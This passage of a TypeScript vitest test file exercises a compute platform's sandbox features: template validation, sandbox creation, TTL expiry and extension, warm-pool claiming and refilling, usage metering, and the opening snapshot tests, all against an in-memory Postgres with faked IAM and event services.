import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import {
  apiMethod,
  ComputeError,
  manualClock,
  newId,
  type AuthzRow,
  type Caller,
  type ManualClock,
  type MethodContext,
  type ModuleContext,
  type SqlExecutor,
  type SqlTx,
} from '@better-compute/core';
import { postgres, useSimClock, setSimClock } from '@better-compute/postgres';
import { createSshCertificateAuthority, parseSshCertificate } from '@better-compute/pki';
import { pglite } from '@better-compute/postgres/pglite';
import {
  capacityMigrations,
  capacityModule,
  createCapacityPort,
  readQuotas,
} from '@better-compute/capacity';
import { create } from '@bufbuild/protobuf';
import { encodeMessage, InstanceSnapshotResultSchema } from '@better-compute/protocol';
import {
  builtinRuntimeTraits,
  instanceSpecs,
  instanceWork,
  meterInstances,
  reassignSandboxes,
  reportInstances,
  sandboxWork,
  setIpPool,
  vps,
  vpsMigrations,
  withdrawAgentSandboxes,
  type VpsApi,
} from '@better-compute/vps';

// Sandboxes (PLAN.md §3.7, D24) below the envelope: templates checked against their pool, sandboxes
// driving one hosted instance each (admission, placement, quota and deletion are the instance's),
// TTL expiry as an ordinary delete, warm pools claimed after admission, and the tenant teardown.

const T0 = Date.UTC(2026, 8, 24, 12);
let db: SqlExecutor;
let clock: ManualClock;

interface Recorded {
  authz: AuthzRow[];
  removed: { type: string; id: string }[];
  pending: { id: string; attributes: unknown }[];
  events: { type: string; subject: string; data: Record<string, unknown> }[];
  commands: {
    id: string;
    nodeId: string;
    kind: string;
    payload: unknown;
    idempotencyKey: string;
  }[];
  decisions: string[];
  fleetDecisions: number;
}
let recorded: Recorded;
/** Actions the fake IAM refuses (the extra decisions vps makes). */
const denied = new Set<string>();
/** The secret broker, for the tests that need one (sealed user data, template env). */
let broker:
  | {
      resolve(ref: string): Promise<string>;
      put(tenantId: string, value: string): Promise<string>;
      delete(ref: string): Promise<void>;
    }
  | undefined;
const fresh = (): Recorded => ({
  authz: [],
  removed: [],
  pending: [],
  events: [],
  commands: [],
  decisions: [],
  fleetDecisions: 0,
});

const alice: Caller = {
  identityId: 'usr_alice',
  identityKind: 'user',
  tenantId: 'acme',
  sessionId: 's',
  sessionKind: 'user',
  mfa: false,
};
const bob: Caller = { ...alice, identityId: 'usr_bob' };
const root: Caller = { ...alice, identityId: 'usr_root', tenantId: 'root' };

const images = {
  async resolve(_tx: SqlTx, _tenantId: string, imageId: string) {
    if (imageId !== 'ubuntu-24.04') return undefined;
    return {
      url: 'https://images.example/ubuntu-24.04.qcow2',
      sha256: 'ab'.repeat(32),
      format: 'qcow2' as const,
      verified: true,
    };
  },
};

function moduleContext(sql: SqlExecutor): ModuleContext {
  return {
    sql,
    clock,
    log: { debug() {}, info() {}, warn() {}, error() {} },
    secrets: broker ?? { resolve: async (ref: string) => `resolved:${ref}` },
    capacity: createCapacityPort({ clock }, { random: () => 0, topN: 1 }),
    authz: {
      async upsert(_tx, row) {
        recorded.authz.push(row);
      },
      async remove(_tx, ref) {
        recorded.removed.push(ref);
      },
      async setPending(_tx, ref, attributes) {
        recorded.pending.push({ id: ref.id, attributes });
      },
    },
    events: {
      async publish(_tx, event) {
        recorded.events.push({
          type: event.type,
          subject: event.subject ?? '',
          data: (event.data ?? {}) as Record<string, unknown>,
        });
      },
    },
    work: { async enqueue() {} },
    desired: { async invalidate() {} },
    // IAM decisions vps adds itself (secrets:manage for templates that use secrets).
    iam: {
      rootTenantId: 'root',
      async require(
        _credential: unknown,
        decision: { action: string; resource: { type: string } },
      ) {
        recorded.decisions.push(decision.action);
        if (decision.resource.type === 'compute-fleet') recorded.fleetDecisions++;
        if (denied.has(decision.action)) throw new ComputeError('ACCESS_DENIED', 'Access denied');
      },
    },
    // A real `commands` row, so settling reads its state and result like the gateway leaves them.
    commands: {
      async enqueue(tx, command) {
        const id = newId('cmd');
        const seq = recorded.commands.length + 1;
        await tx.query(
          `INSERT INTO commands (id, node_id, seq, kind, body, state, not_after, retry_safe,
                                 self_terminating, attested, idempotency_key)
           VALUES ($1, $2, $3, $4, '\\x'::bytea, 'pending', $5::timestamptz, false, false, false, $6)`,
          [
            id,
            command.nodeId,
            seq,
            command.kind,
            new Date(command.notAfter).toISOString(),
            command.idempotencyKey,
          ],
        );
        recorded.commands.push({
          id,
          nodeId: command.nodeId,
          kind: command.kind,
          payload: command.payload,
          idempotencyKey: command.idempotencyKey,
        });
        return { id, seq };
      },
      async cancel() {},
    },
  } as unknown as ModuleContext;
}

function within(tx: SqlTx): SqlExecutor {
  return {
    dialect: 'postgres',
    kind: 'pglite',
    query: (text, params) => tx.query(text, params),
    transaction: (fn, options) => db.transaction(fn, options),
    migrate: () => Promise.reject(new Error('no')),
    close: () => Promise.reject(new Error('no')),
  };
}

const module = vps({ runtimes: ['cloud-hypervisor'], images });
const api = module.api!(moduleContext(db)) as VpsApi;
const capacity = capacityModule({ random: () => 0, topN: 1 });
const capacityApi = capacity.api!(moduleContext(db)) as Record<string, Record<string, unknown>>;

type Definition = {
  validate(raw: unknown): unknown;
  handler(context: MethodContext, input: unknown): Promise<unknown>;
  admission?: {
    prepare(
      context: MethodContext,
      input: unknown,
      tx: SqlTx,
    ): Promise<{ status: string; result?: unknown; resource?: unknown }>;
    denied?(context: MethodContext, input: unknown, tx: SqlTx, error: unknown): Promise<void>;
    check?(context: MethodContext, input: unknown): Promise<void>;
  };
};

async function run(
  definition: Definition,
  raw: unknown,
  who: Caller,
  deny = false,
): Promise<unknown> {
  const input = definition.validate(raw);
  const context = (tx: SqlTx) =>
    ({ ...moduleContext(within(tx)), caller: who, requestId: 'req' }) as MethodContext;
  if (definition.admission) {
    const plan = await db.transaction((tx) =>
      definition.admission!.prepare(context(tx), input, tx),
    );
    if (plan.status === 'replay') return plan.result;
    if (deny) {
      await db.transaction((tx) =>
        definition.admission!.denied!(context(tx), input, tx, new Error('no')),
      );
      throw new ComputeError('ACCESS_DENIED', 'Access denied');
    }
    await definition.admission.check?.(
      {
        ...moduleContext(db),
        caller: who,
        credential: { kind: 'session', token: `ses:${who.identityId}` },
        requestId: 'req',
      } as unknown as MethodContext,
      input,
    );
  }
  return db.transaction((tx) => definition.handler(context(tx), input));
}

const call = (
  group: keyof VpsApi,
  method: string,
  raw: unknown,
  who: Caller = alice,
  deny = false,
) => run((api[group] as Record<string, Definition>)[method]!, raw, who, deny);
const callCapacity = (group: string, method: string, raw: unknown, who: Caller = root) =>
  run(capacityApi[group]![method] as Definition, raw, who);

async function reconcileInstance(instanceId: string): Promise<void> {
  const reconciler = module.reconcilers!.find((entry) => entry.name === instanceWork)!;
  await reconciler.run({ ...moduleContext(db), signal: new AbortController().signal }, instanceId);
}
async function reconcileSandboxes(): Promise<void> {
  const reconciler = module.reconcilers!.find((entry) => entry.name === sandboxWork)!;
  await reconciler.run({ ...moduleContext(db), signal: new AbortController().signal }, 'all');
}

/** The host runtime reports every instance placed on each node in `state`, then they reconcile. */
async function hostsReport(state: 'running' | 'stopped' | 'paused' | 'absent'): Promise<void> {
  const { rows } = await db.query<{ id: string; node_id: string }>(
    `SELECT id, node_id FROM instances WHERE node_id IS NOT NULL AND state <> 'deleted' AND NOT draft`,
  );
  for (const node of new Set(rows.map((row) => row.node_id))) {
    const here = rows.filter((row) => row.node_id === node);
    await db.transaction((tx) =>
      reportInstances(
        tx,
        moduleContext(db).work,
        node,
        state === 'absent' ? [] : here.map((row) => ({ id: row.id, state })),
        { complete: true },
      ),
    );
  }
  for (const row of rows) await reconcileInstance(row.id);
}

async function advance(ms: number): Promise<void> {
  clock.advance(ms);
  await setSimClock(db, clock.now());
}

type SandboxView = {
  id: string;
  instanceId: string;
  state: string;
  instanceState: string;
  expiresAt: number;
  ttlSeconds: number;
  warm: boolean;
  addresses: string[];
  readyAt?: number;
  expiredAt?: number;
};
type TemplateView = { id: string; runtime: string; warm: { min: number; max: number } };

beforeAll(async () => {
  db = pglite();
  await db.migrate([...capacityMigrations, ...vpsMigrations]);
});
afterAll(async () => {
  await db.close();
});

const tables = [
  'sandbox_snapshots',
  'commands',
  'node_labels',
  'sandboxes',
  'sandbox_templates',
  'usage_windows',
  'ip_leases',
  'ip_pools',
  'instances',
  'flavors',
  'pool_capacity_rollup',
  'device_bookings',
  'allocations',
  'node_resources',
  'devices',
  'quota_usage',
  'nodes',
  'pool_offers',
  'pools',
  'sites',
];

let pool: string;
beforeEach(async () => {
  for (const table of tables) await db.query(`DELETE FROM ${table}`);
  recorded = fresh();
  clock = manualClock(T0);
  await useSimClock(db, T0);
  await db.query(
    `INSERT INTO sites (id, owner_tenant_id, kind, region, version) VALUES ('site_01jz00000000000000000000aa', 'root', 'shared', 'eu', 1)`,
  );
  pool = (
    (await callCapacity('pools', 'create', {
      tenantId: 'root',
      siteId: 'site_01jz00000000000000000000aa',
      class: 'vps-host',
    })) as { id: string }
  ).id;
  await callCapacity('pools', 'offer', {
    tenantId: 'root',
    poolId: pool,
    toTenantId: 'acme',
    quota: { vcpu: 32, memoryGiB: 64, diskGiB: 1000 },
  });
  for (const node of ['node_01jz00000000000000000000va', 'node_01jz00000000000000000000vb']) {
    await db.query(
      `INSERT INTO nodes (id, site_id, pool_id, owner_tenant_id, role, provision_state, maintenance, cordoned,
                          connectivity, trust, generation, observed_generation, next_cmd_seq, identity_gen, shard, version)
       VALUES ($1, 'site_01jz00000000000000000000aa', $2, 'root', 'host', 'adopted', false, false, 'connected',
               'platform', 1, 1, 1, 1, 0, 1)`,
      [node, pool],
    );
    for (const [resource, allocatable] of [
      ['vcpu', 16],
      ['memoryGiB', 64],
      ['diskGiB', 1000],
    ] as const)
      await db.query(
        `INSERT INTO node_resources (node_id, resource, allocatable, ratio, allocated) VALUES ($1, $2, $3, 1, 0)`,
        [node, resource, allocatable],
      );
  }
  await setIpPool(db, { poolId: pool, cidr: '10.0.0.0/28', gateway: '10.0.0.1' });
  await call(
    'flavors',
    'create',
    { tenantId: 'root', poolId: pool, name: 's1.small', vcpu: 2, memoryGiB: 4, diskGiB: 20 },
    root,
  );
  recorded = fresh();
});

const templateInput = (extra: Record<string, unknown> = {}) => ({
  tenantId: 'acme',
  name: 'py-small',
  poolId: pool,
  flavor: 's1.small',
  imageId: 'ubuntu-24.04',
  ...extra,
});
const createTemplate = async (extra: Record<string, unknown> = {}) =>
  (await call('sandboxTemplates', 'create', templateInput(extra))) as TemplateView;
const createSandbox = async (
  templateId: string,
  extra: Record<string, unknown> = {},
  who = alice,
) =>
  (await call(
    'sandboxes',
    'create',
    { tenantId: 'acme', templateId, idempotencyKey: 'sbx-1', ...extra },
    who,
  )) as SandboxView;
const getSandbox = async (sandboxId: string) =>
  (await call('sandboxes', 'get', { tenantId: 'acme', sandboxId })) as SandboxView;
const eventTypes = () => recorded.events.map((event) => event.type);
const used = async () =>
  Object.fromEntries(
    (await readQuotas(db, 'acme', pool)).map((row) => [row.resource, Number(row.used)]),
  );

describe('vps() sandboxes surface', () => {
  it('matches the §9.2 rows, and declares the migration and reconciler', () => {
    for (const group of ['sandboxes', 'sandboxTemplates', 'sandboxSnapshots'] as const)
      for (const [method, definition] of Object.entries(
        api[group] as Record<string, { action: string; kind: string }>,
      ))
        expect(apiMethod(group, method), `${group}.${method}`).toMatchObject({
          module: 'vps',
          action: definition.action,
          kind: definition.kind,
          phase: 'v0.5',
        });
    expect(module.migrations!.map((migration) => migration.name)).toContain('vps/0004_sandboxes');
    expect(module.reconcilers!.map((reconciler) => reconciler.name)).toContain(sandboxWork);
    expect(module.tenantDeleted).toBeTypeOf('function');
  });
});

describe('sandbox templates', () => {
  it("checks the pool, flavor, image and runtime once, and names the pool's runtime", async () => {
    const template = await createTemplate({ warm: { min: 1, max: 3 } });
    expect(template).toMatchObject({
      name: 'py-small',
      runtime: 'cloud-hypervisor',
      defaultTtlSeconds: 3600,
      maxTtlSeconds: 86_400,
      warm: { min: 1, max: 3 },
    });
    expect(template.id).toMatch(/^sbxt_/);
    expect(recorded.authz).toMatchObject([
      { type: 'sandbox-template', id: template.id, ownerId: 'usr_alice' },
    ]);
    await expect(createTemplate()).rejects.toMatchObject({ code: 'CONFLICT' });
    await expect(createTemplate({ name: 'b', flavor: 'nope' })).rejects.toMatchObject({
      code: 'NOT_FOUND',
    });
    await expect(createTemplate({ name: 'c', imageId: 'windows-11' })).rejects.toMatchObject({
      code: 'NOT_FOUND',
    });
    await expect(createTemplate({ name: 'd', runtime: 'libvirt-kvm' })).rejects.toMatchObject({
      code: 'INVALID_INPUT',
      message: expect.stringContaining('runs cloud-hypervisor'),
    });
    await expect(
      createTemplate({ name: 'e', defaultTtlSeconds: 7200, maxTtlSeconds: 3600 }),
    ).rejects.toMatchObject({ code: 'INVALID_INPUT' });
    await expect(createTemplate({ name: 'f', warm: { min: 3, max: 1 } })).rejects.toMatchObject({
      code: 'INVALID_INPUT',
    });
    await expect(
      call(
        'sandboxTemplates',
        'create',
        templateInput({ name: 'g', userData: 'secret://other/x' }),
      ),
    ).rejects.toMatchObject({ code: 'INVALID_INPUT' });
    await expect(
      call('sandboxTemplates', 'create', { ...templateInput({ name: 'h' }), env: { A: 'plain' } }),
    ).rejects.toMatchObject({ code: 'INVALID_INPUT' });
    // Env values reach guests sealed by the broker only; this host has none.
    await expect(
      call('sandboxTemplates', 'create', {
        ...templateInput({ name: 'i' }),
        env: { TOKEN: 'secret://acme/api-token' },
      }),
    ).rejects.toMatchObject({ code: 'INVALID_CONFIG' });

    const updated = (await call('sandboxTemplates', 'update', {
      tenantId: 'acme',
      templateId: template.id,
      maxTtlSeconds: 7200,
      userData: '#cloud-config\n',
    })) as { maxTtlSeconds: number; userData?: string; version: number };
    expect(updated).toMatchObject({ maxTtlSeconds: 7200, userData: '#cloud-config\n', version: 2 });
    expect(await call('sandboxTemplates', 'list', { tenantId: 'acme' })).toMatchObject({
      items: [{ id: template.id }],
    });
    expect(
      await call('sandboxTemplates', 'delete', { tenantId: 'acme', templateId: template.id }),
    ).toEqual({ deleted: true });
    await expect(
      call('sandboxTemplates', 'get', { tenantId: 'acme', templateId: template.id }),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
    // The name is free again.
    await createTemplate();
  });
});

describe('sandboxes', () => {
  it('drive one hosted instance: placed and charged like one, replayed by key, refused to instance methods', async () => {
    const template = await createTemplate();
    const sandbox = await createSandbox(template.id);
    expect(sandbox).toMatchObject({
      state: 'starting',
      instanceState: 'provisioning',
      ttlSeconds: 3600,
      expiresAt: T0 + 3600_000,
      warm: false,
      addresses: ['10.0.0.2'],
    });
    expect(sandbox.id).toMatch(/^sbx_[0-9a-z]{52}$/);
    expect(recorded.authz.find((row) => row.type === 'sandbox')).toMatchObject({
      id: sandbox.id,
      parentId: pool,
      ownerId: 'usr_alice',
      attributes: {
        templateId: template.id,
        vcpu: 2,
        memoryGiB: 4,
        gpus: 0,
        ttlSeconds: 3600,
        warm: false,
      },
    });
    expect(recorded.authz.find((row) => row.type === 'instance')).toMatchObject({
      id: sandbox.instanceId,
      ownerId: 'usr_alice',
    });
    expect(eventTypes()).toEqual(['instance.scheduled', 'instance.created', 'sandbox.created']);
    expect(await used()).toMatchObject({ vcpu: 2, memoryGiB: 4, diskGiB: 20 });

    // Replay by key; a different request under it is a conflict.
    expect((await createSandbox(template.id)).id).toBe(sandbox.id);
    await expect(createSandbox(template.id, { ttlSeconds: 600 })).rejects.toMatchObject({
      code: 'CONFLICT',
    });

    // The instance is visible, but only the sandbox moves it.
    const instance = (await call('instances', 'get', {
      tenantId: 'acme',
      instanceId: sandbox.instanceId,
    })) as { id: string };
    expect(instance.id).toBe(sandbox.instanceId);
    for (const method of ['start', 'stop', 'delete'])
      await expect(
        call('instances', method, { tenantId: 'acme', instanceId: sandbox.instanceId }),
      ).rejects.toMatchObject({
        code: 'INVALID_STATE',
        message: expect.stringContaining(`managed by sandbox ${sandbox.id}`),
      });
    await expect(
      call('instances', 'resize', {
        tenantId: 'acme',
        instanceId: sandbox.instanceId,
        flavor: 's1.small',
      }),
    ).rejects.toMatchObject({ code: 'INVALID_STATE' });
  });

  it('forgets a refused draft, bounds the TTL by the template, and refuses unknown templates', async () => {
    const template = await createTemplate({ maxTtlSeconds: 7200 });
    await expect(createSandbox(template.id, {}, alice)).resolves.toBeDefined();
    await expect(
      call(
        'sandboxes',
        'create',
        { tenantId: 'acme', templateId: template.id, idempotencyKey: 'denied' },
        alice,
        true,
      ),
    ).rejects.toMatchObject({ code: 'ACCESS_DENIED' });
    expect((await db.query(`SELECT count(*)::int AS n FROM sandboxes`)).rows[0]).toEqual({ n: 1 });
    expect(recorded.removed.at(-1)).toMatchObject({ type: 'sandbox' });
    await expect(
      createSandbox(template.id, { idempotencyKey: 'long', ttlSeconds: 7201 }),
    ).rejects.toMatchObject({ code: 'INVALID_INPUT' });
    await expect(
      createSandbox('sbxt_01jz0000000000000000000000', { idempotencyKey: 'x' }),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
  });

  it('become ready when the instance runs, and expire into an ordinary instance delete', async () => {
    const template = await createTemplate({ defaultTtlSeconds: 600 });
    const sandbox = await createSandbox(template.id);
    await hostsReport('running');
    await reconcileSandboxes();
    expect(await getSandbox(sandbox.id)).toMatchObject({ state: 'ready', readyAt: T0 });
    expect(eventTypes()).toContain('sandbox.ready');

    await advance(600_000);
    recorded.events = [];
    await reconcileSandboxes();
    expect(eventTypes()).toEqual(['sandbox.expired', 'instance.deleting']);
    expect(await getSandbox(sandbox.id)).toMatchObject({
      state: 'deleting',
      expiredAt: T0 + 600_000,
    });
    // The host drops it; the instance lifecycle frees everything, then the sandbox is deleted.
    await reconcileInstance(sandbox.instanceId);
    await hostsReport('absent');
    expect(await used()).toMatchObject({ vcpu: 0, memoryGiB: 0, diskGiB: 0 });
    expect((await db.query(`SELECT count(*)::int AS n FROM ip_leases`)).rows[0]).toEqual({ n: 0 });
    recorded.events = [];
    await reconcileSandboxes();
    expect(recorded.events).toMatchObject([
      { type: 'sandbox.deleted', subject: `sandbox/${sandbox.id}`, data: { expired: true } },
    ]);
    expect(await getSandbox(sandbox.id)).toMatchObject({ state: 'deleted' });
    expect(await call('sandboxes', 'list', { tenantId: 'acme' })).toMatchObject({ items: [] });
    expect(await call('sandboxes', 'list', { tenantId: 'acme', deleted: true })).toMatchObject({
      items: [{ id: sandbox.id }],
    });
    // Once is enough: the next pass finds nothing.
    recorded.events = [];
    await reconcileSandboxes();
    expect(eventTypes()).toEqual([]);
  });

  it('extend within maxTtl (decided with the new lifetime), and delete through the lifecycle', async () => {
    const template = await createTemplate({ defaultTtlSeconds: 600, maxTtlSeconds: 1800 });
    const sandbox = await createSandbox(template.id);
    const extended = (await call('sandboxes', 'extend', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
      by: '10m',
    })) as SandboxView;
    expect(extended).toMatchObject({ expiresAt: T0 + 1200_000, ttlSeconds: 1200 });
    expect(recorded.pending[0]).toEqual({ id: sandbox.id, attributes: { ttlSeconds: 1200 } });
    await expect(
      call('sandboxes', 'extend', { tenantId: 'acme', sandboxId: sandbox.id, by: '11m' }),
    ).rejects.toMatchObject({ code: 'INVALID_INPUT' });
    // An expiry already reached replays.
    expect(
      await call('sandboxes', 'extend', {
        tenantId: 'acme',
        sandboxId: sandbox.id,
        until: T0 + 60_000,
      }),
    ).toMatchObject({ expiresAt: T0 + 1200_000 });
    await expect(
      call('sandboxes', 'extend', { tenantId: 'acme', sandboxId: sandbox.id }),
    ).rejects.toMatchObject({ code: 'INVALID_INPUT' });

    const deleting = (await call('sandboxes', 'delete', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
    })) as SandboxView;
    expect(deleting.state).toBe('deleting');
    expect(
      (await call('sandboxes', 'delete', {
        tenantId: 'acme',
        sandboxId: sandbox.id,
      })) as SandboxView,
    ).toMatchObject({ state: 'deleting' });
    await expect(
      call('sandboxes', 'extend', { tenantId: 'acme', sandboxId: sandbox.id, by: '1m' }),
    ).rejects.toMatchObject({ code: 'INVALID_STATE' });
    await reconcileInstance(sandbox.instanceId);
    await hostsReport('absent');
    await reconcileSandboxes();
    expect(await getSandbox(sandbox.id)).toMatchObject({ state: 'deleted' });
    expect(recorded.events.find((event) => event.type === 'sandbox.deleted')?.data).toMatchObject({
      expired: false,
    });
  });

  it('list the caller’s own by default', async () => {
    const template = await createTemplate();
    const mine = await createSandbox(template.id);
    const theirs = await createSandbox(template.id, { idempotencyKey: 'bob-1' }, bob);
    expect(await call('sandboxes', 'list', { tenantId: 'acme' })).toMatchObject({
      items: [{ id: mine.id }],
    });
    const all = (await call('sandboxes', 'list', { tenantId: 'acme', scope: 'all' })) as {
      items: { id: string }[];
    };
    expect(all.items.map((item) => item.id).sort()).toEqual([mine.id, theirs.id].sort());
  });
});

describe('warm pools', () => {
  it('keep warm.min paused instances, claimed by creates without a placement, and refilled', async () => {
    const template = await createTemplate({ warm: { min: 2 } });
    await reconcileSandboxes();
    const warm = await db.query<{ id: string; desired_state: string; owner_identity_id: string }>(
      `SELECT id, desired_state, owner_identity_id FROM instances WHERE warm_template_id = $1 ORDER BY created_at, id`,
      [template.id],
    );
    expect(warm.rows).toHaveLength(2);
    expect(warm.rows.every((row) => row.desired_state === 'paused')).toBe(true);
    // Warm instances count against the tenant's quota when created.
    expect(await used()).toMatchObject({ vcpu: 4 });
    // Not the tenant's to see in lists or to move.
    expect(await call('instances', 'list', { tenantId: 'acme', scope: 'all' })).toMatchObject({
      items: [],
    });
    await expect(
      call('instances', 'start', { tenantId: 'acme', instanceId: warm.rows[0]!.id }),
    ).rejects.toMatchObject({ code: 'INVALID_STATE', message: expect.stringContaining('warm') });
    // Claimable once the runtime reports them paused (booted, then paused: memory resident).
    await hostsReport('paused');
    expect(
      (await db.query(`SELECT DISTINCT state FROM instances WHERE warm_template_id IS NOT NULL`))
        .rows,
    ).toEqual([{ state: 'paused' }]);

    const allocations = async () =>
      Number(
        (await db.query<{ n: number }>(`SELECT count(*)::int AS n FROM allocations`)).rows[0]!.n,
      );
    const before = await allocations();
    const sandbox = await createSandbox(template.id, {}, bob);
    expect(sandbox).toMatchObject({ warm: true, instanceId: warm.rows[0]!.id, state: 'starting' });
    expect(await allocations()).toBe(before);
    expect(await used()).toMatchObject({ vcpu: 4 });
    const claimed = await db.query<{
      owner_identity_id: string;
      desired_state: string;
      sandbox_id: string;
      warm_template_id: string | null;
    }>(
      `SELECT owner_identity_id, desired_state, sandbox_id, warm_template_id FROM instances WHERE id = $1`,
      [sandbox.instanceId],
    );
    expect(claimed.rows[0]).toEqual({
      owner_identity_id: 'usr_bob',
      desired_state: 'running',
      sandbox_id: sandbox.id,
      warm_template_id: null,
    });
    expect(recorded.authz.findLast((row) => row.type === 'instance')).toMatchObject({
      type: 'instance',
      id: sandbox.instanceId,
      ownerId: 'usr_bob',
    });
    await hostsReport('running');
    await reconcileSandboxes();
    expect(await getSandbox(sandbox.id)).toMatchObject({ state: 'ready' });
    // The pass refilled the pool.
    expect(
      (
        await db.query(
          `SELECT 1 FROM instances WHERE warm_template_id = $1 AND desired_state <> 'deleted'`,
          [template.id],
        )
      ).rows,
    ).toHaveLength(2);
  });

  it('meter vps.sandbox.warm to the tenant until claimed, then the owner’s usage from the claim', async () => {
    const template = await createTemplate({ warm: { min: 1 } });
    await reconcileSandboxes();
    await hostsReport('paused');
    await advance(30 * 60_000);
    const sandbox = await createSandbox(template.id, {}, bob);
    expect(sandbox.warm).toBe(true);
    await advance(90 * 60_000);
    await db.transaction((tx) => meterInstances(tx, clock.now()));
    const { rows } = await db.query<{
      meter: string;
      identity_id: string | null;
      start_ms: number;
      quantity: string;
    }>(
      `SELECT meter, identity_id, (extract(epoch FROM window_start) * 1000)::float8 AS start_ms, quantity
         FROM usage_windows ORDER BY meter, window_start`,
    );
    const lines = rows.map((row) => [
      row.meter,
      row.identity_id,
      Number(row.start_ms) - T0,
      Number(row.quantity),
    ]);
    expect(lines).toEqual([
      ['vps.memory.gib.hours', 'usr_bob', 0, 2],
      ['vps.memory.gib.hours', 'usr_bob', 3600_000, 4],
      // 2 vCPU warm for half an hour, the tenant's.
      ['vps.sandbox.warm', null, 0, 1],
      // Bob's from the claim on: half of the first hour, then the whole second.
      ['vps.vcpu.hours', 'usr_bob', 0, 1],
      ['vps.vcpu.hours', 'usr_bob', 3600_000, 2],
    ]);
  });

  it('are claimed only after an allow: a denied create leaves the pool untouched', async () => {
    const template = await createTemplate({ warm: { min: 1 } });
    await reconcileSandboxes();
    await hostsReport('paused');
    const warmState = async () =>
      (
        await db.query<{ warm_template_id: string | null; desired_state: string; owner: string }>(
          `SELECT warm_template_id, desired_state, owner_identity_id AS owner FROM instances`,
        )
      ).rows;
    const before = await warmState();
    await expect(
      call(
        'sandboxes',
        'create',
        { tenantId: 'acme', templateId: template.id, idempotencyKey: 'denied' },
        bob,
        true,
      ),
    ).rejects.toMatchObject({ code: 'ACCESS_DENIED' });
    expect(await warmState()).toEqual(before);
    expect(before).toEqual([
      { warm_template_id: template.id, desired_state: 'paused', owner: 'usr_alice' },
    ]);
    expect((await db.query(`SELECT 1 FROM sandboxes`)).rows).toEqual([]);
    // The next allowed create takes it.
    expect((await createSandbox(template.id, {}, bob)).warm).toBe(true);
  });

  it('replace warm instances that failed instead of counting them forever', async () => {
    const template = await createTemplate({ warm: { min: 1 } });
    await reconcileSandboxes();
    const [broken] = (
      await db.query<{ id: string }>(`SELECT id FROM instances WHERE warm_template_id = $1`, [
        template.id,
      ])
    ).rows;
    await db.query(`UPDATE instances SET state = 'error' WHERE id = $1`, [broken!.id]);
    await reconcileSandboxes();
    const { rows } = await db.query<{ id: string; desired_state: string }>(
      `SELECT id, desired_state FROM instances WHERE warm_template_id = $1 ORDER BY created_at, id`,
      [template.id],
    );
    expect(rows.find((row) => row.id === broken!.id)?.desired_state).toBe('deleted');
    expect(rows.filter((row) => row.desired_state !== 'deleted')).toHaveLength(1);
  });

  it('keep instances stopped on a runtime that cannot pause', async () => {
    const template = await createTemplate({ warm: { min: 1 } });
    const noPause = vps({
      runtimes: ['cloud-hypervisor'],
      runtimeTraits: {
        'cloud-hypervisor': {
          isolation: 'microvm',
          multiTenant: true,
          gpuPassthrough: true,
          imageFormats: ['raw', 'qcow2'],
        },
      },
      images,
    });
    await noPause
      .reconcilers!.find((entry) => entry.name === sandboxWork)!
      .run({ ...moduleContext(db), signal: new AbortController().signal }, 'all');
    expect(
      (
        await db.query(`SELECT desired_state FROM instances WHERE warm_template_id = $1`, [
          template.id,
        ])
      ).rows,
    ).toEqual([{ desired_state: 'stopped' }]);
  });

  it('drain beyond warm.max and when the template is deleted; a miss falls back to a cold create', async () => {
    const template = await createTemplate({ warm: { min: 2 } });
    await reconcileSandboxes();
    // Unclaimable (not reported paused yet): a cold create.
    const cold = await createSandbox(template.id);
    expect(cold.warm).toBe(false);
    await call('sandboxTemplates', 'update', {
      tenantId: 'acme',
      templateId: template.id,
      warm: { min: 0, max: 1 },
    });
    await reconcileSandboxes();
    const live = async () =>
      (
        await db.query(
          `SELECT 1 FROM instances WHERE warm_template_id = $1 AND desired_state <> 'deleted'`,
          [template.id],
        )
      ).rows.length;
    expect(await live()).toBe(1);
    await call('sandboxTemplates', 'delete', { tenantId: 'acme', templateId: template.id });
    await reconcileSandboxes();
    expect(await live()).toBe(0);
    // The sandbox of a deleted template lives on.
    expect((await getSandbox(cold.id)).state).toBe('starting');
  });
});

describe('snapshots', () => {
  const deletedObjects: string[] = [];
  const store = {
    async presign(input: { snapshotId: string }) {
      return {
        uploadUrl: `https://store.example/put/${input.snapshotId}?sig=x`,
        uploadHeaders: { 'x-amz-acl': 'private' },
        url: `https://store.example/${input.snapshotId}`,
      };
    },
    async delete(input: { snapshotId: string }) {
      deletedObjects.push(input.snapshotId);
    },
  };
  const withStore = vps({ runtimes: ['cloud-hypervisor'], images, snapshots: store });
  const storeApi = withStore.api!(moduleContext(db)) as VpsApi;
  const callStore = (method: string, raw: unknown, who: Caller = alice) =>
    run((storeApi.sandboxes as Record<string, Definition>)[method]!, raw, who);
  const reconcileWith = (key: string) =>
    withStore
      .reconcilers!.find((entry) => entry.name === sandboxWork)!
      .run({ ...moduleContext(db), signal: new AbortController().signal }, key);
  type SnapshotView = {
    id: string;
    state: string;
    cpuModel?: string;
    sha256?: string;
    reason?: string;
  };
  const settle = async (commandId: string, state: 'succeeded' | 'failed', cpuModel = '') => {
    const result = encodeMessage(
      InstanceSnapshotResultSchema,
      create(InstanceSnapshotResultSchema, {
        uploadedBytes: 1234n,
        sha256: new Uint8Array(32).fill(0xab),
        runtime: 'cloud-hypervisor',
        cpuModel,
      }),
    );
    await db.query(`UPDATE commands SET state = $2, result = $3, reason = $4 WHERE id = $1`, [
      commandId,
      state,
      state === 'succeeded' ? result : null,
      state === 'failed' ? 'unsupported' : null,
    ]);
  };
  const running = async () => {
    const template = await createTemplate();
    const sandbox = await createSandbox(template.id);
    await hostsReport('running');
    return { template, sandbox };
  };

  it('need a store, and a running sandbox', async () => {
    const { sandbox } = await running();
    await expect(
      call('sandboxes', 'snapshot', { tenantId: 'acme', sandboxId: sandbox.id }),
    ).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
    // A runtime that cannot snapshot is refused up front, before a command reaches the host.
    const noSnapshots = vps({
      runtimes: ['cloud-hypervisor'],
      runtimeTraits: {
        'cloud-hypervisor': { ...builtinRuntimeTraits['cloud-hypervisor']!, snapshot: false },
      },
      images,
      snapshots: store,
    });
    await expect(
      run(
        ((noSnapshots.api!(moduleContext(db)) as VpsApi).sandboxes as Record<string, Definition>)
          .snapshot!,
        { tenantId: 'acme', sandboxId: sandbox.id },
        alice,
      ),
    ).rejects.toMatchObject({ code: 'UNSUPPORTED' });
    expect(recorded.commands).toEqual([]);
